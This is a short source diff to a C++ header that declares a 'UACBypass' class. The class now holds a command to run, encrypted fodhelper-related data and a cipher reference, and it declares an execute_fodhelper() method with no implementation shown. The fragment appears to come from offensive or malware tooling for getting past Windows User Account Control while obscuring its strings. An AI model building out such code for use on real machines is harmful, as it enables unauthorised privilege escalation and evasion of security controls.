@@ -3,16 +3,23 @@
 
 #include <string>
 #include <vector>
+#include <cstdint>
+
+class easCipher42;
 
 class UACBypass {
 private:
     bool verbose = false;
-    std::string loader_path;
-    std::string args;
+    std::string command_to_execute;
+    const uint8_t* fodhelper_enc_data;
+    size_t fodhelper_enc_size;
+    easCipher42& cipher;
 
 public:
-    UACBypass(const std::string& path, const std::string& cmdline_args, bool verbose_mode = false)
-        : loader_path(path), args(cmdline_args), verbose(verbose_mode) {}
+    UACBypass(const std::string& cmd, const uint8_t* fh_enc, size_t fh_enc_size,
+              easCipher42& cipher_ref, bool verbose_mode = false)
+        : command_to_execute(cmd), fodhelper_enc_data(fh_enc), fodhelper_enc_size(fh_enc_size),
+          cipher(cipher_ref), verbose(verbose_mode) {}
 
     bool execute_fodhelper();
 };
